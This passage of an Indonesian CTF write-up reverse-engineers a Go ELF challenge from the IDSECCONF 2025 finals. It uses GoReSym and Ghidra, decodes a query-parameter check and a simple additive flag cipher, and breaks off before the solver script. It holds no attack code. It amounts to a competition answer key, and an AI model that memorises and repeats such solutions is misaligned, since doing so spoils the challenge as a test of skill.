+<p>Untuk dekompilasi ELF binary Golang, kita memerlukan plugin <strong>GoReSym</strong> Ghidra untuk mendapatkan dekompilasi dari fungsi <code>main.main</code>. Selengkapnya bisa membaca artikel berikut ini: <a href="https://nikkoenggaliano.my.id/read.php?id=45" target="_blank" rel="noopener noreffer ">https://nikkoenggaliano.my.id/read.php?id=45</a>.</p>
+<p>Sebelum itu, kita perlu melakukan symbol recovery pada ELF binary tersebut dengan tool <code>GoReSym</code>. Berikut adalah perintahnya:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">GoReSym -t -d -p laba-laba &gt; symbols.json</span></span></code></pre></div></div>
+<p>Load file <code>symbols.json</code> dengan plugin GoReSym di Ghidra.</p>
+<p>Di folder <code>m</code> terdapat decompiled code <code>main.main</code> , which is itu yang kita cari-cari untuk mengetahui algoritma dekripsi key. Selain itu, ada juga <code>main.flag</code> untuk informasi tambahan yg berkaitan dengan flag.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/ctf-idsecconf2025_finals_rev4-01.png"
+        data-srcset="/images/ctf-idsecconf2025_finals_rev4-01.png, /images/ctf-idsecconf2025_finals_rev4-01.png 1.5x, /images/ctf-idsecconf2025_finals_rev4-01.png 2x"
+        data-sizes="auto"
+        alt="/images/ctf-idsecconf2025_finals_rev4-01.png"
+        title="laba-laba_01" width="405" height="245" /></p>
+<p>Berikut adalah dekompilasi fungsi <code>main.main</code>:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="n">main</span><span class="p">.</span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="o">*</span><span class="n">puVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">unaff_R14</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">in_XMM15_Qa</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">in_XMM15_Qb</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">stack0x00000000</span> <span class="o">&lt;=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined1</span> <span class="o">**</span><span class="p">)(</span><span class="n">unaff_R14</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">runtime</span><span class="p">.</span><span class="nf">morestack_noctxt</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">net</span><span class="o">/</span><span class="n">http</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puVar1</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)</span><span class="n">runtime</span><span class="p">.</span><span class="nf">newobject</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puVar1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">puVar1</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="cl">  <span class="s">&#34;:8080false&lt;nil&gt;Error1562578125&amp;amp;&amp;#34;&amp;#39;Rangehttpsclose:pathHTTP1HTTP2%s %qHTTP/Allow%s:%d:h ttpFoundwritelstatint16int32int64uint8arrayslice and tls: EarlyparseMarchAprilmonthLocallinuxfiles imap2imap3imapspop3shostsutf-8%s*%dtext/rangedefersweeptestRtestWexecWhchanexecRschedsudogtimergsc anmheaptracepanicsleepgcing MB,  got= ...</span><span class="se">\n</span><span class="s"> max=scav  ptr ] = (trap:init  ms, fault tab= tag= top= [...], fp:Realmbad nGreeksse41sse42ssse3SHA-1P-224P-256P-384P-521ECDSA (at ClassStringFormat[]byte string390625GOAWAYClosedunusedactiveclosedCANCELPADDEDCookiemethodschemeexpectstreamExpectPragma&lt;/ a&gt;.</span><span class="se">\n</span><span class="s">Lockedremovespliceuint16uint32uint64structchan&lt;-&lt;-chan ValueX25519%w%.0wlengthkem_idSundayMon dayFridayAugustminutesecondGOROOTAcceptServernetdnsdomaingophertelnetreturn.locallisten.onionndots :ip+netsocketacceptallow&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puVar1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">in_XMM15_Qa</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puVar1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">in_XMM15_Qb</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">net</span><span class="o">/</span><span class="n">http</span><span class="p">.(</span><span class="o">*</span><span class="n">Server</span><span class="p">).</span><span class="nf">ListenAndServe</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>Dan ini adalah dekompilasi fungsi <code>main.flag</code>:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="n">main</span><span class="p">.</span><span class="nf">flag</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="o">*</span><span class="n">plVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_RAX</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">lVar2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">lVar3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ulong</span> <span class="n">uVar4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">unaff_R14</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">lStack0000000000000008</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_ab</span> <span class="p">[</span><span class="mi">27</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_90</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_88</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_80</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="o">*</span><span class="n">local_78</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined</span> <span class="o">**</span><span class="n">ppuStack_70</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="o">*</span><span class="n">local_68</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="o">*</span><span class="n">local_60</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="n">lStack0000000000000008</span> <span class="o">=</span> <span class="n">in_RAX</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">local_68</span> <span class="o">&lt;=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">***</span><span class="p">)(</span><span class="n">unaff_R14</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">runtime</span><span class="p">.</span><span class="nf">morestack_noctxt</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">FUN_0047f60b</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_88</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">runtime</span><span class="p">.</span><span class="nf">mapIterStart</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">do</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">local_68</span> <span class="o">==</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((((</span><span class="n">local_68</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xd</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">plVar1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">local_68</span><span class="p">,</span> <span class="o">*</span><span class="n">plVar1</span> <span class="o">==</span> <span class="mh">0x6e6f636365736449</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">plVar1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x32303266</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">plVar1</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">)</span> <span class="o">==</span> <span class="sc">&#39;5&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">lVar2</span> <span class="o">=</span> <span class="o">*</span><span class="n">local_60</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">lVar3</span> <span class="o">=</span> <span class="n">local_60</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">      <span class="k">while</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&lt;</span> <span class="n">lVar3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">local_90</span> <span class="o">=</span> <span class="n">lVar3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">local_80</span> <span class="o">=</span> <span class="n">lVar2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">lVar2</span> <span class="o">=</span> <span class="n">strconv</span><span class="p">.</span><span class="nf">Atoi</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">lVar2</span> <span class="o">!=</span> <span class="mi">99</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">lStack0000000000000008</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LAB_0061d038</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">uVar4</span> <span class="o">=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)(</span><span class="n">lStack0000000000000008</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="k">goto</span> <span class="n">LAB_0061d076</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">builtin_strncpy</span><span class="p">(</span><span class="n">local_ab</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="s">&#34;&amp;+</span><span class="se">\x1f</span><span class="s">$7/</span><span class="se">\&#34;\x1e\x17</span><span class="s">&amp;$</span><span class="se">\x1a\x13</span><span class="s">#</span><span class="se">\x1b\x16\x13\x14\r\x16\x1f\n\x1c\x0e\t\x13</span><span class="s">#&#34;</span> <span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="mh">0x1b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">lVar2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">lVar2</span> <span class="o">&lt;</span> <span class="mh">0x1b</span><span class="p">;</span> <span class="n">lVar2</span> <span class="o">=</span> <span class="n">lVar2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="n">local_ab</span><span class="p">[</span><span class="n">lVar2</span><span class="p">]</span> <span class="o">=</span> <span class="n">local_ab</span><span class="p">[</span><span class="n">lVar2</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">lVar2</span> <span class="o">+</span> <span class="sc">&#39;@&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">lVar2</span> <span class="o">=</span> <span class="n">lStack0000000000000008</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">lStack0000000000000008</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="n">uVar4</span> <span class="o">=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)(</span><span class="n">lStack0000000000000008</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="k">do</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">lVar2</span> <span class="o">=</span> <span class="p">(</span><span class="n">uVar4</span> <span class="o">&amp;</span> <span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)</span><span class="n">PTR_DAT_0094bc30</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">PTR_DAT_0094bc30</span> <span class="o">+</span> <span class="n">lVar2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">lStack0000000000000008</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">              <span class="n">lVar2</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">PTR_DAT_0094bc30</span> <span class="o">+</span> <span class="n">lVar2</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">              <span class="k">goto</span> <span class="n">LAB_0061cf0e</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">uVar4</span> <span class="o">=</span> <span class="n">uVar4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">PTR_DAT_0094bc30</span> <span class="o">+</span> <span class="n">lVar2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="n">lVar2</span> <span class="o">=</span> <span class="n">runtime</span><span class="p">.</span><span class="nf">typeAssert</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LAB_0061cf0e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">local_88</span> <span class="o">=</span> <span class="n">lVar2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">runtime</span><span class="p">.</span><span class="nf">slicebytetostring</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ppuStack_70</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined</span> <span class="o">**</span><span class="p">)</span><span class="n">runtime</span><span class="p">.</span><span class="nf">convTstring</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">local_78</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">DAT_006943c0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fmt</span><span class="p">.</span><span class="nf">Fprintf</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_78</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_006943c0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_006f4b7b</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">lVar2</span> <span class="o">=</span> <span class="n">local_80</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">lVar3</span> <span class="o">=</span> <span class="n">local_90</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">runtime</span><span class="p">.</span><span class="nf">mapIterNext</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="n">uVar4</span> <span class="o">=</span> <span class="n">uVar4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">PTR_DAT_0094bc10</span> <span class="o">+</span> <span class="n">lVar2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LAB_0061d076</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lVar2</span> <span class="o">=</span> <span class="p">(</span><span class="n">uVar4</span> <span class="o">&amp;</span> <span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)</span><span class="n">PTR_DAT_0094bc10</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">PTR_DAT_0094bc10</span> <span class="o">+</span> <span class="n">lVar2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">lStack0000000000000008</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">lStack0000000000000008</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">PTR_DAT_0094bc10</span> <span class="o">+</span> <span class="n">lVar2</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">goto</span> <span class="n">LAB_0061d038</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">lStack0000000000000008</span> <span class="o">=</span> <span class="n">runtime</span><span class="p">.</span><span class="nf">typeAssert</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LAB_0061d038</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_78</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">DAT_006943c0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ppuStack_70</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">PTR_DAT_007650c0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fmt</span><span class="p">.</span><span class="nf">Fprint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">lStack0000000000000008</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_78</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p><strong>I. Logic Validation dalam <code>main.flag</code>:</strong></p>
+<p><strong>Condition 1: Query Parameter Check</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">((((</span><span class="n">local_68</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xd</span><span class="p">)</span> <span class="o">&amp;&amp;</span>      <span class="p">(</span><span class="n">plVar1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">local_68</span><span class="p">,</span> <span class="o">*</span><span class="n">plVar1</span> <span class="o">==</span> <span class="mh">0x6e6f636365736449</span><span class="p">))</span> <span class="o">&amp;&amp;</span>    <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">plVar1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x32303266</span><span class="p">))</span> <span class="o">&amp;&amp;</span>     <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">plVar1</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">)</span> <span class="o">==</span> <span class="sc">&#39;5&#39;</span><span class="p">))</span><span class="err">`</span></span></span></code></pre></div></div>
+<p><strong>Decoding hex values:</strong></p>
+<ul>
+<li><code>0xd</code> = 13 (panjang string)</li>
+<li><code>0x6e6f636365736449</code> = <strong>&ldquo;Idseccon&rdquo;</strong> (little-endian)</li>
+<li><code>0x32303266</code> = <strong>&ldquo;f202&rdquo;</strong></li>
+<li><code>'5'</code> = <strong>&lsquo;5&rsquo;</strong></li>
+</ul>
+<p><strong>Combined:</strong> <code>&quot;Idsecconf2025&quot;</code> (13 chars) ✅</p>
+<p><strong>Condition 2: Value Must Be 99</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">lVar2</span> <span class="o">=</span> <span class="n">strconv</span><span class="p">.</span><span class="nf">Atoi</span><span class="p">();</span><span class="k">if</span> <span class="p">(</span><span class="n">lVar2</span> <span class="o">!=</span> <span class="mi">99</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// fail
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></div></div>
+<p>Query parameter <strong>value harus = &ldquo;99&rdquo;</strong></p>
+<p><strong>II. Flag Decryption Algorithm</strong></p>
+<p><strong>Encrypted Data:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">builtin_strncpy</span><span class="p">(</span><span class="n">local_ab</span><span class="p">,</span>    <span class="s">&#34;&amp;+</span><span class="se">\x1f</span><span class="s">$7/</span><span class="se">\&#34;\x1e\x17</span><span class="s">&amp;$</span><span class="se">\x1a\x13</span><span class="s">#</span><span class="se">\x1b\x16\x13\x14\r\x16\x1f\n\x1c\x0e\t\x13</span><span class="s">#&#34;</span><span class="p">,</span>    <span class="mh">0x1b</span><span class="p">);</span>  <span class="c1">// 27 bytes`
+</span></span></span></code></pre></div></div>
+<p><strong>Decryption Loop:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="n">lVar2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">lVar2</span> <span class="o">&lt;</span> <span class="mh">0x1b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">lVar2</span> <span class="o">=</span> <span class="n">lVar2</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">local_ab</span><span class="p">[</span><span class="n">lVar2</span><span class="p">]</span> <span class="o">=</span> <span class="n">local_ab</span><span class="p">[</span><span class="n">lVar2</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">lVar2</span> <span class="o">+</span> <span class="sc">&#39;@&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p><strong>Formula dekripsi key:</strong> <code>flag[i] = encrypted[i] + i + 64</code></p>
+<p>Karena sudah mendapatkan informasi yang cukup untuk dekripsi key, langsung saja kita craft solver script untuk mendapatkan flag. Berikut adalah final solver script yang saya buat:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
